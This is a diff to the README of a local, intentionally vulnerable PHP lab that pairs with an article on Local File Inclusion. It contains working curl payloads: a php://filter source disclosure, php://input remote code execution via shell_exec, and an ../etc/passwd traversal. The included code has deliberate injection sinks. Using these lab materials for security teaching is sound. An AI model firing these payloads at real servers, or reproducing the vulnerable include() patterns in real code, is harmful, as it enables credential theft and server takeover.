@@ -6,10 +6,10 @@ The companion lab for TechEarl's Local File Inclusion / Path Traversal article. 
 
 | Endpoint | Vulnerable parameter | Sink shape |
 |---|---|---|
-| `/view.php?page=about` | `page` | `include('pages/' . $_GET['page'] . '.php')`, suffix appended |
+| `/view.php?page=pages/about` | `page` | `include($_GET['page'] . '.php')`, suffix appended |
 | `/view-raw.php?page=pages/about.php` | `page` | `include($_GET['page'])`, raw, no suffix |
 
-The two sinks exist side by side so the article can contrast what the `.php` suffix actually blocks (textbook `/etc/passwd` read against `view.php`) against what it does not block (the two PHP-wrapper attacks, which both ignore the trailing string).
+The two sinks exist side by side so the article can contrast what the `.php` suffix actually blocks (the literal `/etc/passwd` read against `view.php`, since the engine would try to open `/etc/passwd.php`) against what it does not block (the `php://filter` source-disclosure trick, where the suffix becomes part of the `resource=` argument).
 
 ## Running
 
@@ -37,28 +37,28 @@ The null-byte truncation trick (`%00`) does NOT work against `/view.php` on PHP 
 
 ### 2. php://filter source disclosure against view.php
 
-`view.php` appends `.php` to the requested name, so the naive `/etc/passwd` read fails. The `php://filter` wrapper sidesteps the suffix because everything after the `resource=` argument is ignored:
+`view.php` appends `.php` to the requested name, so the literal `/etc/passwd` read fails (the engine looks for `/etc/passwd.php`). The `php://filter` wrapper sidesteps the suffix because everything after the `resource=` argument is treated as the file path the wrapper opens, including the appended `.php`:
 
 ```bash
-curl 'http://localhost:8084/view.php?page=php://filter/convert.base64-encode/resource=index'
+curl 'http://localhost:8084/view.php?page=php://filter/convert.base64-encode/resource=pages/about'
 ```
 
-The response contains the base64-encoded source of `index.php`. Decode it locally:
+The response contains the base64-encoded source of `pages/about.php`. Decode it locally:
 
 ```bash
-curl -s 'http://localhost:8084/view.php?page=php://filter/convert.base64-encode/resource=index' \
+curl -s 'http://localhost:8084/view.php?page=php://filter/convert.base64-encode/resource=pages/about' \
   | grep -oE '[A-Za-z0-9+/=]{40,}' | base64 -d
 ```
 
-Repeat against `view`, `view-raw`, `shared/layout` to pull every PHP source file the application ships. Source disclosure exposes secrets, hard-coded credentials, and the precise sink shapes needed to weaponise other endpoints.
+Repeat against `view`, `view-raw`, `shared/layout` (using `resource=view`, `resource=view-raw`, etc. — the wrapper appends the `.php` and reaches the file) to pull every PHP source file the application ships. Source disclosure exposes secrets, hard-coded credentials, and the precise sink shapes needed to weaponise other endpoints.
 
-### 3. php://input remote code execution against view.php
+### 3. php://input remote code execution against view-raw.php
 
-With `allow_url_include=On` (set by the lab's `php.ini` override) the `php://input` wrapper reads the POST body as PHP source and executes it. The suffix `view.php` appends is irrelevant to the wrapper.
+With `allow_url_include=On` (set by the lab's `php.ini` override) the `php://input` wrapper reads the POST body as PHP source and executes it. The wrapper only matches the literal path `php://input`, so this attack runs against `view-raw.php` (no suffix), not `view.php` (where the appended `.php` produces `php://input.php`, which the wrapper does not recognise).
 
 ```bash
 curl -X POST --data '<?php echo shell_exec("id"); ?>' \
-  'http://localhost:8084/view.php?page=php://input'
+  'http://localhost:8084/view-raw.php?page=php://input'
 ```
 
 The response includes the output of `id` (`uid=33(www-data) gid=33(www-data) ...`). Any PHP can run, not just `shell_exec`: file write, reverse shell, persistent webshell, database egress, anything available to the `www-data` process inside the container.
@@ -90,7 +90,7 @@ The lab's Dockerfile adds `www-data` to the `adm` group so the `0640 root:adm` a
 curl -s http://localhost:8084/ | grep -c 'lfi-basic'
 
 # Intended use works
-curl -s 'http://localhost:8084/view.php?page=about' | grep -c '<h2>About</h2>'
+curl -s 'http://localhost:8084/view.php?page=pages/about' | grep -c '<h2>About</h2>'
 
 # Confirm the raw LFI sink reaches outside the docroot
 curl -s 'http://localhost:8084/view-raw.php?page=../../../../etc/passwd' | grep -c 'root:x:0:0'
